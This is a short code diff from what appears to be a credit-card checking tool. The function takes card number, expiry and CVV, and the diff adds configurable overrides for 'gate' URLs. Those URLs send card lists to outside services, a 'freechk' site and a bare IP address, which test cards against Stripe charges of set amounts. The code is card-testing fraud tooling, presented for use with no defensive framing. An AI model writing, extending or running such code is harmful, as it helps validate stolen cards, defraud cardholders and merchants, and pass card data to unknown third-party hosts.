@@ -658,10 +658,14 @@ def check_stripe_amount_gate(cc, mm, yy, cvv, gate_name):
             'str': 'Stripe $15',
             'dep': 'Stripe $49'
         }.get(gate_name, f'Stripe ${amount}')
-        
+
+        def _gov_a(idx, full_url):
+            ov = get_gate_cfg(f'generic_{gate_name}_url{idx}', '').strip()
+            return ov if ov else full_url
+
         urls = [
-            f"{get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')}?lista={lista}&amount={amount}",
-            f"{get_gate_cfg('stripe_charge_url', 'http://15.204.130.9:6969/check')}?cc={lista}&gate=stripe{amount}",
+            _gov_a(1, f"{get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')}?lista={lista}&amount={amount}"),
+            _gov_a(2, f"{get_gate_cfg('stripe_charge_url', 'http://15.204.130.9:6969/check')}?cc={lista}&gate=stripe{amount}"),
         ]
         
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
